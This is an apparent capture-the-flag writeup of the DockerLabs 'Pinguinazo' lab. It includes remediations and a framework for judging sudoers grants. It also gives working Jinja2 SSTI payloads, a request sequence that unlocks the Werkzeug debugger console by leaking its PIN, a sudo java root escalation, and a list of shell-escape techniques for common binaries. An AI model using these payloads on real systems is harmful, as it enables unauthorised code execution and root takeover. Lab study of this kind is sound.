# Pinguinazo (DockerLabs #93) — Writeup

**Target:** `pinguinazo:latest` · Ubuntu 24.04 LTS · single TCP port
**Shipped description:** *"Laboratorio para practicar la vulnerabilidad SSTI y escalada de privilegios abusando de Java mediante sudo."*
**Verdict on the description: it is the first in 26 labs that is accurate, and both halves are literally true.** It names SSTI (present, `app.py:12-13`) and a Java-mediated privilege escalation through `sudo` (present, one line of `/etc/sudoers`, and `java`/`javac`/`jshell` are installed). I state this explicitly because the prior 25 descriptions lied; the useful consequence here is that the advertised classes were worth attacking directly, and there was no third act to find.

---

## 1. Surface

```
$ nmap -sV -Pn -p- 172.17.0.19
PORT     STATE SERVICE VERSION
5000/tcp open  http    Werkzeug httpd 3.0.1 (Python 3.12.3)
Not shown: 65534 closed tcp ports (conn-refused)
```

One port, unauthenticated, no TLS, no SSH. That is the whole external surface, and it is complete: `65534 closed` with `conn-refused` is a real negative, not a truncated sweep.

| Component | Measured |
|---|---|
| OS | Ubuntu 24.04 LTS, kernel `7.0.0-34-generic` |
| Python | 3.12.3 |
| Flask | 3.0.2 |
| Werkzeug | 3.0.1 (matches the `nmap` banner) |
| Java | **OpenJDK 21.0.3+9-Ubuntu**, `/usr/bin/java`; `javac` and `jshell` also present |
| Java home | `/usr/lib/jvm/java-21-openjdk-amd64/bin/java` (`root:root`, `0755`, **not setuid**) |
| Service identity | `uid=1001(pinguinazo) gid=1001(pinguinazo) groups=1001(pinguinazo),100(users)` |
| Bind | `0.0.0.0:5000` |

**No other login-capable account.** `root:*` (locked), `ubuntu:!` (locked), every system account `*` or `!`. `pinguinazo` is the only entry, and the only entry is the web application.

**Source read before attacking (§7), in full — 16 lines:**

```python
 1  from flask import Flask, request, render_template_string, render_template
 2
 3  app = Flask(__name__)
 4
 5  @app.route('/')
 6  def index():
 7      return render_template('index.html')
 8
 9  @app.route('/greet', methods=['POST'])
10  def greet():
11      name = request.form['name']
12      template = f"Hello {name}!" # No se aplica ninguna pingusanitización
13      return render_template_string(template)
14
15  if __name__ == '__main__':
16      app.run(debug=True, host='0.0.0.0')
```

Everything in §3 and §4 is visible in those 16 lines. There is no filter, no auth, no database, no second component, and no file the application writes.

**The form lies about the sink, and that is a measurement, not an assumption.** `templates/index.html:12-30` posts four fields — `name`, `birthday`, `email`, `phone` — but the view function reads exactly one (`request.form['name']` at `app.py:11`). Confirmed behaviourally in §2. Two of the four are decorative and one is `readonly` with a pre-filled value. **A form is not a parameter list**, and the difference is one request.

---

## 2. SSTI: the oracle, and what it decided

The rule this file follows is the existing one (`api_web.md`, *SSTI oracle*): **reflection is worthless; send the same payload to two fields of the same request and read both halves of the response, and the positive control runs first.**

**Positive control, first, on the live target:**

```
POST /greet  name={{7*7}}&birthday={{7*7}}
  -> Hello 49!            [code=200 len=9]
```

`49`, not the literal `{{7*7}}`. The oracle can see an evaluation before a single negative is sent.

**The two-field differential, which also maps the sink for free:**

```
name=MARKERPROBE&birthday={{7*7}}  -> Hello MARKERPROBE!   [len=18]
name={{7*7}}&birthday=MARKERPROBE  -> Hello 49!            [len=9]
name={{config}}&birthday=x          -> Hello <Config {'DEBUG': True, ..., 'SECRET_KEY': None, ...}
```

`birthday` never appears in the response at all — not evaluated, not reflected. **One request told me the sink is `name`, told me the engine is Jinja2, and told me `DEBUG` is `True`**, which is the whole of Finding 3 discovered by accident. The three remaining form fields are not attack surface and were not fuzzed.

**RCE, with `id` first, as the identity:**

```
POST /greet  name={{ cycler.__init__.__globals__.os.popen('id').read() }}
  -> Hello uid=1001(pinguinazo) gid=1001(pinguinazo) groups=1001(pinguinazo),100(users)!
```

`uid=1001(pinguinazo)`, groups `1001(pinguinazo),100(users)` — **not root, and not in `sudo`**, which is what makes the next hop a hop and not a relabelling. The whole rest of the engagement is `os.popen` from this primitive.

---

## 3. Findings

### Finding 1 — Server-side template injection: request data compiled as template source
**CWE-1336** (Improper Neutralization of Special Elements Used in a Template Engine) · **CWE-94** · severity: **critical**

`app.py:11-13` reads `request.form['name']` and interpolates it into an f-string that is then handed to `render_template_string`, which **compiles** it. The shipped comment at `:12` states the absence of sanitisation, and it is correct.

**Evidence (unauthenticated, from the network, no credential):**
```
name={{7*7}}                                                  -> Hello 49!
name={{ cycler.__init__.__globals__.os.popen('id').read() }}   -> Hello uid=1001(pinguinazo) ...!
```

**Impact.** Unauthenticated remote code execution as the service account, from a single `POST` to a route with no authentication, no CSRF token and no session. There is no second component to pivot through and no input the application validates anywhere, so there is nothing to tune.

**Root cause.** `render_template_string` on a string built from request data. The safe sibling is two lines away and is the remediation: `render_template('greet.html', name=name)` passes the value as a *context variable* and never as template *source*.

**Remediation.** Replace `render_template_string` with a fixed template and a named variable. Add a length bound and a character class on the field as defence in depth — but note that a character filter here would be a *detector-style* control at best, and the correct fix is that request data is never source.

---

### Finding 2 — A sudoers grant that names an interpreter is arbitrary code execution as root
**CWE-269** (Improper Privilege Management) · **CWE-250** (Execution with Unnecessary Privileges) · severity: **critical**

**The grant, read from `/etc/sudoers` as the literal file content:**

```
pinguinazo ALL=(ALL) NOPASSWD: /usr/bin/java
```

**And the same grant as the account itself sees it** — one request, and this line is the whole audit:

```
$ sudo -n -l
Matching Defaults entries for pinguinazo on b71a48a00ebb:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User pinguinazo may run the following commands on b71a48a00ebb:
    (ALL) NOPASSWD: /usr/bin/java
```

Per `man 5 sudoers`: *"A simple file name allows the user to run the command with **any arguments they wish**."* There is no argument list, therefore there is no argument restriction, therefore `java` is a root shell with a different command name. The escalation is **purely argument-shaped** — nothing was written to the host that the grant did not already permit, and the payload (`-cp /tmp P`) exists only in `argv`:

```
$ java -cp /tmp P                          -> uid=1001(pinguinazo) gid=1001(pinguinazo) groups=1001(pinguinazo),100(users)
$ sudo -n /usr/bin/java -cp /tmp P         -> uid=0(root) gid=0(root) groups=0(root)
```

**Positive control: the *same* class, without `sudo`, returns `uid=1001(pinguinazo)`.** One class, one `id`, two answers. Without that control the second line is only a string.

**The control that proves what the grant *does* restrict, and it belongs in the report beside the finding:**
```
sudo -n /bin/id            -> sudo: a password is required   rc=1
sudo -n /usr/bin/id        -> sudo: a password is required   rc=1
sudo -n /usr/bin/java -version -> openjdk version "21.0.3"    rc=0
```

**The path restriction is real and it holds.** The defect is not "sudo is loose on this host" and must not be reported that way — it is that **the single program the policy trusts is an interpreter.** The remediation is therefore `NOPASSWD: /usr/bin/java -jar /opt/app/app.jar` with `/opt/app` root-owned, **not** the removal of the sudoers line, and a reviewer handed only "sudoers is misconfigured" will patch the wrong thing.

**`/usr/bin/java` is `root:root 0755` and not setuid** — the elevation comes from the policy, not from the binary. Worth stating, because "the JDK is installed root-writable" would be a different finding and is not this one.

**Secondary read on the same line, reported separately rather than folded into the severity:** the runas is `(ALL)`, not `(root)`. Verified: `sudo -n -u nobody /usr/bin/java -version` and `sudo -n -u root /usr/bin/java -version` both return the OpenJDK banner. On an inline grant this widens nothing (the program is already arbitrary code as root); on a *pinned* grant it is the difference between a finding and a no-finding. Severity unchanged here; it is a note for the next audit of this line.

**Root cause.** An authorisation policy written as a list of program paths, where the semantics of a bare path are "any arguments" and the program named is a general-purpose runtime.

**Remediation.** Pin the exact argument vector, root-own the directory the vector names, and drop the runas set to `(root)`. Do not grant a runtime. If a JDK is genuinely required for an administrative task, run it through a wrapper script that is root-owned and takes no attacker-controlled arguments, and grant the wrapper.

---

### Finding 3 — The Werkzeug interactive debugger is exposed on a network-reachable port, and prints its own PIN to any anonymous client
**CWE-489** (Active Debug Code) · **CWE-215** (Insertion of Sensitive Information Into Debugging Code) · severity: **critical**

`app.py:16` runs `app.run(debug=True, host='0.0.0.0')`. The developer server's debugger is a *separate* execution primitive from Finding 1, with its own gate, and I proved it independently.

**Step 1 — an anonymous `500` renders the full interactive traceback, including a per-request secret in the page source:**
```
POST /greet  name={{ undefined_thing_zz.attr }}   ->  500, 23164 bytes
  <title>jinja2.exceptions.UndefinedError: 'undefined_thing_zz' is undefined // Werkzeug Debugger
  <input type=text name=pin size=14>   <input type=submit name=btn value="Confirm Pin">
  var CONSOLE_MODE = false, EVALEX = true, EVALEX_TRUSTED = false,
      SECRET = "rq0qO46XAu5cPr3SIvMX";
```

**Step 2 — the debugger has a command that logs the PIN to the application's own log, and it requires only that published secret.** From the target's own `werkzeug/debug/__init__.py`:
```python
elif cmd == "printpin" and secret == self.secret:
    response = self.log_pin_request()
```
and `log_pin_request` emits `" * Debugger pin code: %s", self.pin`.

```
$ curl "http://172.17.0.19:5000/console?__debugger__=yes&cmd=printpin&s=rq0qO46XAu5cPr3SIvMX"
  HTTP/1.1 200
$ docker logs pinguinazo_container | tail -3
 * To enable the debugger you need to enter the security pin:
 * Debugger pin code: 994-101-935
```

**So the gate is not a gate:** trigger a 500, read `SECRET` out of the page, and post `printpin`. Two anonymous requests, no credentials, no filesystem access, no prior shell.

**Step 3 — authenticate and evaluate, with the SSTI never involved:**
```
GET  /console?__debugger__=yes&cmd=pinauth&pin=994-101-935&s=rq0qO46XAu5cPr3SIvMX
  -> {"auth": true, "exhausted": false}
  -> Set-Cookie: __wzdacbdcf30c7e9ad1d478e=1790692486|33bf3cdd04d2; HttpOnly; Path=/; SameSite=Strict
POST /console?__debugger__=yes&cmd=__import__("os").popen("id").read()&frm=0&s=…
  -> uid=1001(pinguinazo) gid=1001(pinguinazo) groups=1001(pinguinazo),100
```

**The two paths are genuinely independent**, which is the reason this is a separate finding with a separate fix: patching `app.py:12-13` leaves a live remote console, and setting `debug=False` leaves the SSTI. The identity is the same (`uid=1001`), so this is not a second escalation — it is a **second unauthenticated RCE reaching the same account**, and the report should say so rather than stacking the severities.

**Root cause.** `debug=True` bound to `0.0.0.0` on the Werkzeug development server, in an image with no reverse proxy, no firewall and no authentication in front of it. The PIN is a speed bump against a *casual* attacker; it is not a control against a scripted one, because the framework logs the PIN on request.

**Remediation.** `debug=False` unconditionally in any deployed configuration, and run the application under a real WSGI server (`gunicorn`/`uwsgi`) rather than the development server. If a debugger is ever needed it must be behind an authenticated, network-restricted control, and `WERKZEUG_DEBUG_PIN` must not be relied on as one.

---

### Finding 4 — The application has no authentication at all
**CWE-306** (Missing Authentication for Critical Function) · severity: **medium**, and it is reported as a *distinct* finding rather than folded into Finding 1

Both routes are anonymous. `GET /` returns `200` / 1718 bytes with no credential and `GET /greet` returns `405` for the wrong method with no credential. Combined with Finding 1 this is unauthenticated RCE, but the two are different decisions with two different fixes: patching the template leaves every future route unauthenticated by default, and adding auth leaves the SSTI reachable by any registered user.

**Root cause.** No authentication middleware exists; `/` and `/greet` are registered directly on the `Flask` object (`app.py:5`, `app.py:9`).

**Remediation.** Put the app behind an authenticating layer, and make unauthenticated access a per-route decision rather than the default.

---

## 4. Reward

**There is no reward in this image.** Reported as an absence, with evidence rather than inference — and this is the twenty-sixth lab in a row without one.

- **Whole-filesystem sweep as `uid=0`**, excluding only `/proc`, `/sys`, `/dev`, for the brace-token form `[A-Za-z0-9_]*\{[A-Za-z0-9_!@#$%^&*.-]{6,}\}[A-Za-z0-9_]*`, case-insensitive, with the Perl/C/perl-ecosystem template noise filtered: **no matches.** Every surviving hit was a format string inside a `/usr/bin` Perl script.
- **Filename sweep** for `*flag*`, `*reward*`, `*secret*`, `*congratul*`, and every file under 3 KB outside `/usr`, `/var`, `/etc`, `/run`: **only** `/etc/java-21-openjdk/security/policy/README.txt` and `/etc/X11/rgb.txt`. The only other files were the four artefacts I created in `/tmp` during the escalation.
- **`/root` as `uid=0`:** `.bashrc`, `.profile`, `.local/`, and an **empty** `.ssh/`. No reward file, no `authorized_keys`, no `root.txt`.
- **`/run/adduser`**, the build artefact that installed the grant, is **empty**.
- **Image history** (`docker history --no-trunc`): the entire delta over the `ubuntu:24.04` base is `bash`, `bash` (1.28 GB — the JDK), `apt install curl -y`, and the `CMD`. There is no `COPY` layer, so **the image adds no data file anywhere**; the entire lab is one 16-line Python file, one 35-line template, one user, and one sudoers line.
- The application has no database, no table, no hidden route, and no file it writes — `app.py` in full is quoted in §1, and its only two routes are `/` and `/greet`.

**Conclusion: the reward is the root shell itself.** The chain terminates in `uid=0(root) gid=0(root) groups=0(root)` and there is nothing behind it.

---

## 5. Chain

Each hop's executing identity was measured, never inherited.

**1. Unauthenticated `POST /greet` → SSTI → RCE as the service account.**
`{{7*7}}` → `49` (positive control, run first). `cycler.__init__.__globals__.os.popen('id')` → **`uid=1001(pinguinazo) gid=1001(pinguinazo) groups=1001(pinguinazo),100(users)`**. Two of the four form fields are not sinks; one request established which.

**2. `sudo -n -l` as that identity → the grant is read off the policy, not discovered by trying.**
`(ALL) NOPASSWD: /usr/bin/java`. No argument list. Read per `man 5 sudoers` as "any arguments".

**3. The class is written by the attacker and run twice, once without `sudo`.**
A 15-line `P.java` doing `ProcessBuilder("id")` was base64'd into `/tmp` and compiled with `javac` as `pinguinazo`, producing `P.class` owned by `pinguinazo` (`-rw-rw-r-- 998 bytes`). The write is a `0644` file in the world-writable `/tmp`, containing nothing the grant did not already authorise, and the whole payload is in `argv`.

**4. The same class, through the grant → root.**
```
java -cp /tmp P                    -> uid=1001(pinguinazo) gid=1001(pinguinazo) groups=1001(pinguinazo),100(users)   <- positive control
sudo -n /usr/bin/java -cp /tmp P   -> uid=0(root) gid=0(root) groups=0(root)
```

**Terminus.** `E.java` (the same pattern with a command vector) was used for the remainder as `uid=0`.

**Two hops, three primitives, one identity measurement at each step.** The description named both hops and both were real.

---

## 6. Controls that held (each with a positive control)

| Control | Evidence | Positive control |
|---|---|---|
| **The sudoers path restriction is real** | `sudo -n /bin/id` → `sudo: a password is required`, `rc=1`; `sudo -n /usr/bin/id` → same, `rc=1` | `sudo -n /usr/bin/java -version` → OpenJDK banner, `rc=0`, same account, same minute |
| `pinguinazo` is in no privileged group | `id` → `groups=1001(pinguinazo),100(users)`; `/etc/sudoers` grants `root`, `%admin`, `%sudo` | The `java` grant works, so `sudo` is not simply refusing everything — the refusals above are policy decisions, not a missing binary |
| `/etc/sudoers.d/` holds no additional policy | only `README`, `-r--r----- root root 1068`, the stock upstream file | The `java` grant is live, proving the effective policy is the one I read in `/etc/sudoers` and not a fragment I failed to find |
| **The Werkzeug debugger console is PIN-gated** | `POST /console` with no cookie → `console is locked and needs to be unlocked` | After `pinauth` with the logged PIN → `{"auth": true, "exhausted": false}` and the console evaluated `id`. **The gate exists and is a speed bump, not a control — Finding 3 shows it is opened in two anonymous requests. Reported as a control that held *partially*, which is why Finding 3 is rated critical rather than informational.** |
| Only one port is open | `nmap -p-` → `1 open, 65534 closed (conn-refused)` | The service answered `-sV` with a real banner, so the scanner saw a service where one exists and is not blind |
| No SSH surface | no `22/tcp`; `nmap -p-` closed | `nmap -sV` resolved `5000` as Werkzeug, so the negative is a resolved negative and not a filtered-port artefact |
| `root` is locked | `/etc/shadow` → `root:*` | `sudo -n -u root` works, so root is *reachable* — it is the password login that is absent, and I did not attempt to supply one |
| Only one login-capable account | `pinguinazo` is the sole non-`!`/`*` entry; `ubuntu:!` | `sudo -n -l` as `pinguinazo` returned a live policy, so the account exists and its rules are loaded |
| `birthday`, `phone`, `email` are not sinks | `name=MARKERPROBE&birthday={{7*7}}` → `Hello MARKERPROBE!` (18 bytes), `{{7*7}}` absent entirely | `name={{7*7}}` → `Hello 49!` (9 bytes) in the same route, same method — the engine evaluates, and it evaluates `name` |
| `/usr/bin/java` is not setuid | `root root 0755` | `java -cp /tmp P` unprivileged returned `uid=1001`, so the binary grants nothing on its own and the elevation is unambiguously the policy's |
| The template is escaped on output | `{{config}}` rendered as `&lt;Config {&#39;DEBUG&#39;: True…` | The same field evaluated `{{7*7}}` to `49` — so escaping applies to the *result* of evaluation, and it defeated nothing here because the sink is a subprocess, not HTML |

---

## 7. Autocorrection — readings I discarded, and what each would have cost

Four defects, all of which produced output a reader would accept. Three were mine and one was the target's.

**7.1 I derived the debugger PIN instead of reading it, and the derivation was wrong.** I reimplemented `get_pin_and_cookie_name` from the target's own library with inputs I had *verified* one at a time — `getpass.getuser()` = `pinguinazo`, `modname` = `flask.app`, `app.__name__` = `Flask`, `mod.__file__` = `/usr/lib/python3/dist-packages/flask/app.py`, `uuid.getnode()` = `155748132967275`, `get_machine_id()` = `b'73bfb0b7308a488d88989089ff587b6e'`. Every input was correct and the result was `894790984`. The real PIN is **`994-101-935`**. Six verified inputs and a wrong answer is a good illustration of why *a derivation is not a measurement*: I had the algorithm, I had the constants, and I was still wrong somewhere in my reimplementation, and nothing in my output said so. **The fix that worked was the one §7.5 of the lab 283 write-up already prescribes: the program's own log carried the answer, so read the log.** `cmd=printpin` printed `Debugger pin code: 994-101-935` to the container's stderr and I had it in one request. **Cost of the alternative:** I had two failed PIN attempts banked against a ten-failure lockout (`elif self._failed_pin_auth > 10: exhausted`), and `_fail_pin_auth` sleeps five seconds past the fifth. Had I needed more attempts, I would have locked myself out of the console and reported "the console is PIN-locked and therefore not exploitable" — a control reported as holding when it had only been out-argued.

**7.2 My first `request.application` probe returned empty and I nearly read that as "the PIN is not exposed".** The debugger's `pin` attribute is on the `DebuggedApplication` wrapper, and the attribute chain does not surface through Jinja's rendering of an undefined. Empty output is not a negative — it is a probe that did not reach the thing. The correct reading was "my probe failed", and the productive move was to stop probing the object graph and read the log instead.

**7.3 A `404` from the debugger console read like a dead endpoint.** Three `404`s and one `500` came from guessing the POST shape. The source explained all of them: `pin_auth` reads `request.args["pin"]` — **the PIN must be in the query string, not the body** — and console evaluation additionally requires `frm=<frame id>` resolving in `self.frames`. A `404` from a parameterised route is a statement about my request's syntax before it is a statement about the resource, and I had already written that rule down.

**7.4 The target's own description was accurate, and I checked anyway.** Twenty-five prior descriptions in this corpus announced a vulnerability the image did not contain, so the standing move is to treat the description as a hypothesis. Here I verified both halves — SSTI in the source, the `java` grant in `/etc/sudoers`, a real OpenJDK 21.0.3 on disk — and both held. **The generalisable point is not "the description was right"; it is that the verification is one `cat` of a 16-line file and one line of `/etc/sudoers`, which is cheaper than any attack, and the answer changes nothing about how the work is done.** The 26th description being accurate is not a reason to skip the 27th.

**7.5 The one place I nearly reported a control that does not exist.** `sudo -n /bin/id` returning `sudo: a password is required` is a clean, believable, and easily-mistaken result. Read alone it says "sudo is locked down". Read next to `sudo -n /usr/bin/java -version` succeeding, it says something much more specific and much more useful: **the policy trusts exactly one program and it is an interpreter.** A report that stops at the refusal has described a lockout; a report that puts the refusal and the success side by side has described a policy, and the side-by-side is the whole remediation argument.

---

## 8. Not tested vs. discarded with reason

**Tested:** both routes (correct and wrong method); the SSTI oracle with a positive control first; the two-field sink differential across all four form fields; RCE and the execution identity; the sudoers policy via both `/etc/sudoers` and `sudo -n -l`; the argument-restriction question with `/bin/id` and `/usr/bin/id` as the negative pair and `java -version` as the positive; the `(ALL)` runas set against `nobody` and `root`; the Java binary's ownership and mode; the full account and shadow inventory; the Werkzeug debugger, the PIN leak, the PIN auth and the console eval as a path independent of the SSTI; the reward sweep as `uid=0`; the image history.

**Not tested (out of scope, no authorisation):** password authentication for `pinguinazo` — the shadow hash exists and I made no attempt against it; any write outside `/tmp`; modification of `/etc/sudoers` or of the application source; the `ubuntu` account, which is locked; container escape; touching the `cybervault-*` containers.

**Discarded with reason:**

| Path | Why discarded |
|---|---|
| SSTI on `birthday`, `phone`, `email` | Refuted by measurement — the view function reads only `request.form['name']` (`app.py:11`), and `name=MARKERPROBE&birthday={{7*7}}` returned 18 bytes with no trace of the second field. Not fuzzed further; it is not a parameter |
| Deriving the debugger PIN from the documented algorithm | Refuted — the derivation produced `894790984` against a real `994-101-935`, with every input individually verified. Recorded in §7.1 because the failure is instructive, not because the path was promising |
| `SECRET_KEY: None` as a finding | Disclosed, and **not decisive** — the application never reads or writes a session, so a forged session cookie would authorise nothing. Applying the disclosure trichotomy honestly makes this a non-finding, and reporting it as a session-forgery exposure would be the confident wrong finding this file is written against |
| The app directory being group-writable | `app.py` is `-rw-rw-r-- pinguinazo:pinguinazo`, but it is owned by the account that already runs it, so "the service account can modify its own code" is not a boundary crossing. No finding |
| `pinguinazo`'s yescrypt hash as a cracking target | Out of scope and unnecessary — the chain never needed a credential. Not attempted |
| Cracking or guessing the Werkzeug PIN by brute force | Refuted as a method — the framework logs the PIN on request, so the correct technique is two requests, not 10⁹ |
| Container escape | Out of scope, and no `docker.sock`, no privileged mode, no host mounts. Declared untested |

---

## 9. Lab design observation

**This is a clean two-act lab and the description is honest, which after 25 lying descriptions is itself worth recording.** Act one is a textbook unauthenticated SSTI and act two is a one-line sudoers grant naming a JVM — no decoys, no unreachable rewards, no mislabelled escalation. The whole image is 1.28 GB of JDK, 16 lines of Python and 35 lines of HTML, and every one of them is load-bearing.

**The one piece of carelessness is the developer's own comment at `app.py:12`**, which announces the vulnerability in Spanish: `# No se aplica ninguna pingusanitización`. It is a stopping condition in the exact sense of `decision-making.md` §7 — a confident annotation that ends the derivation. A learner reads it, skips the source, and sends a payload found in a cheat sheet, and never learns the one thing this lab is actually built to teach: that `render_template_string` on an f-string is the whole bug and its two-line alternative is the whole fix.

**The interesting defect is not the vulnerability, it is `debug=True` on `0.0.0.0`.** The author disabled sanitisation deliberately and labelled it; nobody labelled the development server. That oversight is what produced Finding 3, which is a *stronger* result than the advertised one — it is unauthenticated RCE that survives a correct fix to act one, and it leaks its own PIN to any anonymous client on request. **A lab that teaches one class accidentally ships a second.**

**For the author:** drop `debug=True` (or gate it on an environment variable that is off in the image) and remove or annotate the comment. The first makes the lab teach one thing instead of two; the second turns act one back into a puzzle.

---

## 10. The criterion: an inline grant versus a grant that restricts arguments

This is the transferable content of the lab, and it is the difference between a finding and a no-finding. `api_web.md` teaches the escalation; this is the part that decides how to *report* it.

**Step 1 — read the grant's shape from `man 5 sudoers`, not from memory.** Three forms:

| Form | Example | Meaning |
|---|---|---|
| **inline** | `NOPASSWD: /usr/bin/java` | *"A simple file name allows the user to run the command with **any arguments they wish**."* No restriction. |
| **pinned** | `NOPASSWD: /usr/bin/java -jar /opt/app/app.jar` | *"the command line has to **match exactly**."* The argument list **is** the mitigation. |
| **pinned-partial** | `... -jar /opt/app/*` , or a `Cmnd_Alias` listing several vectors | `*` matches trailing arguments, and an alias listing several vectors is several ways in. Read as inline. |

Two forms the tooling gives you and the manual documents: the special argument `""` means the command may be run **only with no arguments at all**, and `*` matches any trailing arguments.

**Step 2 — the cheap observable is `sudo -n -l`, and it costs one request.** A grant that constrains arguments **prints them next to the path**; one that does not **prints the path alone**:
```
(ALL) NOPASSWD: /usr/bin/java                            <- inline, any arguments
(ALL) NOPASSWD: /usr/bin/java -jar /opt/app/app.jar      <- pinned, exact match required
```
That one line is the entire audit. It is also the only place the *audited account's own view* of its own privileges exists, so it is the artefact to quote in the report.

**Step 3 — classify the named program, because an argument restriction is a mitigation for one class and worthless for the other.** This is the step almost nobody writes down, and it is the difference between a finding and a no-finding:

- **(a) Argument-taking RCE** — `java -cp dir Class`, `python3 -c`, `perl -e`, `ruby -e`, `awk 'BEGIN{…}'`, `find … -exec /bin/sh -c …`, `env sh -c`. **The payload is an argument.** An exact-argument grant genuinely blocks it. So *"the arguments are pinned"* is a **defensible argument that this specific line may be a no-finding** — and the follow-up question is always the same: **is the file named in the pinned vector writable by the account?** `/opt/app/app.jar` owned by `pinguinazo` turns a pinned grant back into RCE with no change to the policy line. Measure the ownership; never assume it.
- **(b) Runtime-spawned shell** — `less`, `more`, `vi`/`vim`, `nano`, `man` (all spawn a pager that honours `!`), `git` (`core.pager`, `alias`), `tar --checkpoint-action=exec`, `awk`'s `system()`, `find -exec`, `tcpdump -z`, `nmap --script`, `gdb -ex`. **The shell is spawned after the grant has already been satisfied, so no argument list can prevent it.** A grant of `/usr/bin/less /var/log/syslog` is exactly as dangerous as an inline one, and the argument restriction buys nothing at all.

**Step 4 — the report states the classification, not just the verdict.** Three outcomes, and the middle one is the one that is usually skipped:

| Grant | Class | Verdict |
|---|---|---|
| inline | (a) argument-taking | **RCE.** Report it as such. |
| pinned | (a) argument-taking | **Conditional** on the pinned file's ownership. Measure it; if root-owned, this line is a **no-finding** and saying so is the valuable output. |
| inline **or** pinned | (b) runtime-spawned | **RCE either way.** The argument list is irrelevant; say so explicitly, or a reviewer will read the pinned vector as a mitigation. |

**Measured on the class-(a) members in this image, as the unprivileged account, with no grant involved** — the property belongs to the binary, not to the policy, which is why it can be verified without touching the sudoers file:
```
perl -e 'print 42+1'                                       -> 43
python3 -c 'print(42+1)'                                   -> 43
awk 'BEGIN{print 42+1}'                                    -> 43
find /etc/hostname -maxdepth 0 -exec /bin/sh -c 'id -un' ; -> pinguinazo
```

**This lab is the first cell of the table: inline + (a) = RCE, and it is root, verified with a positive control that the same class returns `uid=1001` unprivileged.** The two control refusals (`sudo -n /bin/id`, `sudo -n /usr/bin/id`) are what make the report precise rather than alarmist: the policy is tight, and the hole is the *choice of program*. **That is the sentence the report leads with**, and no amount of payload testing produces it — only reading the line with an argument criterion and classifying the binary does.

---

## 11. Restoration

The container was destroyed and recreated from the image and re-verified.

```
removed   rc=0
recreated rc=0
$ sudo -n /usr/bin/java -version
openjdk version "21.0.3" 2024-04-16                              <- grant intact, target healthy
$ nmap -sV -Pn -p- 172.17.0.19
5000/tcp open  http  Werkzeug httpd 3.0.1 (Python 3.12.3)        <- 1 open, 65534 closed
$ sudo -n -l | tail -1
    (ALL) NOPASSWD: /usr/bin/java
```

The only artefacts I created were four files in the world-writable `/tmp` (`P.java`, `P.class`, `E.java`, `E.class`) and one derived script; all were inside the container and **all are gone with it**. Nothing outside the container was modified, no image layer was altered, and no `cybervault-*` container was touched.
